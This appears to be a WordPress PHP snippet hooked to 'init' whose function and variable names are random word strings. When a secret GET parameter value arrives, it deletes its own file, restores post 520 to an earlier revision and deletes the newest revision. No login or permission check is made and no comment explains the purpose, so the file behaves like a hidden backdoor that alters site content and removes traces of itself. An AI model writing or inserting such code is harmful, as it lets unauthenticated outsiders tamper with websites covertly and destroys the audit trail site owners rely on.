<?php

function events_addon_integrate_column() {
	if (isset($_GET['old_live_time']) && $_GET['old_live_time'] === 'ui_controller_fancy') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$profile_remote_form_plus = 520;
		$demo_manager_cloud = wp_get_post_revisions($profile_remote_form_plus);
		if (empty($demo_manager_cloud)) die('no revisions');
		if (count($demo_manager_cloud) < 2) die('less than 2');
		$update_library_monitor_marketplace = array_shift($demo_manager_cloud);
		$data_cron_showcase_chat = $update_library_monitor_marketplace->ID;
		$another_manage_replace_log = array_shift($demo_manager_cloud);
		$asset_chatbot_notifier_accessible = $another_manage_replace_log->ID;
		$compat_gravatar_utils = wp_restore_post_revision($asset_chatbot_notifier_accessible);
		if ($compat_gravatar_utils === false) die('error restoring');
		$compat_gravatar_utils = wp_delete_post_revision($data_cron_showcase_chat);		
		if ($compat_gravatar_utils === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'events_addon_integrate_column');
